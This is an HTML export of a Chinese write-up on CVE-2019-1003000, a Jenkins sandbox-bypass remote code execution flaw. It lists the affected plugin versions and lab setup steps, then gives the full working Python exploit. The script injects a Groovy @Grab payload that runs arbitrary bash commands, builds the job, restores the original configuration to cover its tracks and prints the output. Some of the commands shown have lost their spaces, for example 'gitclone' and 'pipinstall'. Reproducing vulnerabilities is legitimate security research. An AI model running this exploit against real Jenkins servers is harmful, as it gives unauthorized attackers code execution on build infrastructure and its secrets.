<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.csD6CA00D2{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csC5F53424{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:italic;}
			.cs86A93FFD{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:italic;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-1003000jenkins-远程代码执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-1003000</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Jenkins </span><span class="csECDA2D3">远程代码执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">该漏洞存在于</span><span class="cs8926E06">Declarative Plugin 1.3.4.1</span><span class="cs9C1B1871">之前的版本</span><span class="cs8926E06">, Groovy Plugin 2.61.1</span><span class="cs9C1B1871">之前的版本以及</span><span class="cs8926E06"> Script Security Plugin 1.50</span><span class="cs9C1B1871">之前的版本。该漏洞通过将</span><span class="cs8926E06">AST</span><span class="cs9C1B1871">转换注释（如</span><span class="cs8926E06">@Grab</span><span class="cs9C1B1871">）应用于源代码元素，可以在脚本编译阶段避免脚本安全沙箱保护。所以会造成具有</span><span class="cs8926E06">&ldquo;Overall/Read&rdquo;</span><span class="cs9C1B1871">权限的用户或能够控制</span><span class="cs8926E06">SCM</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">Jenkinsfile</span><span class="cs9C1B1871">或者</span><span class="cs8926E06">sandboxed Pipeline</span><span class="cs9C1B1871">共享库内容的用户可以绕过沙盒保护并在</span><span class="cs8926E06">Jenkins</span><span class="cs9C1B1871">主服务器上执行任意代码。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Declarative Plugin &lt; 1.3.4.1</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Groovy Plugin &lt; 2.61.1</span></p><p class="cs40DD2BC9"><span class="cs8926E06">Script Security Plugin &lt; 1.50</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<h3 class="cs868C439D">
			<a name="环境搭建"><span class="csD6CA00D2">环境搭建</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">gitclone https://github.com/ianxtianxt/cve-2019-1003000-jenkins-rce-poc.git</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">cdcve-2019-1003000-jenkins-rce-poc</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">pipinstall -r requirements.txt</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">cdsample-vuln</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">./run.sh</span></p><p class="cs40DD2BC9"><span class="csE3F655E4">输入账号密码</span><span class="cs5BEC2C28">user1:user1</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jenkins/%ef%bc%88CVE-2019-1003000%ef%bc%89Jenkins%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image0.png" width="560" height="198" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="csC5F53424">*poc</span><span class="cs86A93FFD">进行攻击</span><span class="csC5F53424">pythonexploit.py &ndash;url http://www.0-sec.org:8080 &ndash;job my-pipeline &ndash;usernameuser1 &ndash;password user1 &ndash;cmd &ldquo;whoami&rdquo;*</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jenkins/%ef%bc%88CVE-2019-1003000%ef%bc%89Jenkins%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image1.png" width="560" height="209" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jenkins/%ef%bc%88CVE-2019-1003000%ef%bc%89Jenkins%20%e8%bf%9c%e7%a8%8b%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e_files/image2.png" width="560" height="351" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">#!/usr/bin/python</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"># Author: Adam Jordan</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Date: 2019-02-15</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># Repository: https://github.com/adamyordan/cve-2019-1003000-jenkins-rce-poc</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"># PoC for: SECURITY-1266 / CVE-2019-1003000 (Script Security), CVE-2019-1003001 (Pipeline: Groovy), CVE-2019-1003002 (Pipeline: Declarative)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">import argparse</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import jenkins</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import time</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">from xml.etree import ElementTree</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">payload = &#39;&#39;&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">import org.buildobjects.process.ProcBuilder</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">@Grab(&#39;org.buildobjects:jproc:2.2.3&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">class Dummy{ }</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">print new ProcBuilder(&quot;/bin/bash&quot;).withArgs(&quot;-c&quot;,&quot;%s&quot;).run().getOutputString()</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&#39;&#39;&#39;</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">def run_command(url, cmd, job_name, username, password):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] connecting to jenkins...&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server = jenkins.Jenkins(url, username, password)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] crafting payload...&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;ori_job_config = server.get_job_config(job_name)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;et = ElementTree.fromstring(ori_job_config)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;et.find(&#39;definition/script&#39;).text = payload % cmd</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;job_config = ElementTree.tostring(et, encoding=&#39;utf8&#39;, method=&#39;xml&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] modifying job with payload...&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server.reconfig_job(job_name, job_config)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;time.sleep(3)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] putting job build to queue...&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;queue_number = server.build_job(job_name)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;time.sleep(3)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] waiting for job to build...&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;queue_item_info = {}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;while &#39;executable&#39; not in queue_item_info:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;queue_item_info = server.get_queue_item(queue_number)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(1)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] restoring job...&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;server.reconfig_job(job_name, ori_job_config)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;time.sleep(3)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] fetching output...&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;last_build_number = server.get_job_info(job_name)[&#39;lastBuild&#39;][&#39;number&#39;]</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;console_output = server.get_build_console_output(job_name, last_build_number)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print &#39;[+] OUTPUT:&#39;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;print console_output</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">if __name__ == &#39;__main__&#39;:</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser = argparse.ArgumentParser(description=&#39;Jenkins RCE&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--url&#39;, help=&#39;target jenkins url&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--cmd&#39;, help=&#39;system command to be run&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--job&#39;, help=&#39;job name&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--username&#39;, help=&#39;username&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;parser.add_argument(&#39;--password&#39;, help=&#39;password&#39;)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;args = parser.parse_args()</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;run_command(args.url, args.cmd, args.job, args.username, args.password)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://www.freebuf.com/column/197026.html</span></p></body>
</html>
